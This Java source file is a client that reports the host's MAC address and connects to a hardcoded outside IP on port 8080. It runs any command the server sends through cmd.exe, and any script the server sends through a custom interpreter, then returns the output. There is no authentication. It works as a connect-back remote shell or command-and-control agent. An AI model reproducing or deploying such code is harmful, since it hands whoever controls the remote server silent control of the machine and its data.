import ParserPackage.Parser;
import org.json.simple.JSONObject;

import java.io.*;

public class Main {
    public static void main(String[] args) throws IOException {
        System.out.println(SocketHandler.getMACAddress());

        SocketHandler socketHandler = SocketHandler.connect("3.89.196.174", 8080);
        socketHandler.setOnDataListener(data -> {
            if (data.getType().equals("command")) {
                ProcessBuilder processBuilder = new ProcessBuilder();
                processBuilder.command("cmd.exe", "/c", "\"" + ((String) data.getMap().get("command")).replaceAll("\"", "^\"") + "\"");
                try {
                    Process process = processBuilder.start();
                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                    StringBuilder stringBuilder = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) stringBuilder.append(line).append("\n");
                    JSONObject result = new JSONObject();
                    result.put("type", "result");
                    result.put("result", stringBuilder.toString());
                    socketHandler.write(result.toString());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            } else if (data.getType().equals("psl")) {
                String psl = (String) data.getMap().get("command");
                try {
                    FileWriter fileWriter = new FileWriter("program.psl");
                    fileWriter.write(psl);
                    fileWriter.close();
                    PrintStream systemOut = System.out;
                    ByteArrayOutputStream out = new ByteArrayOutputStream();
                    System.setOut(new PrintStream(out));
                    Parser.interpret("program.psl");
                    System.setOut(systemOut);
                    JSONObject result = new JSONObject();
                    result.put("type", "result");
                    result.put("result", out.toString());
                    socketHandler.write(result.toString());
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }
}
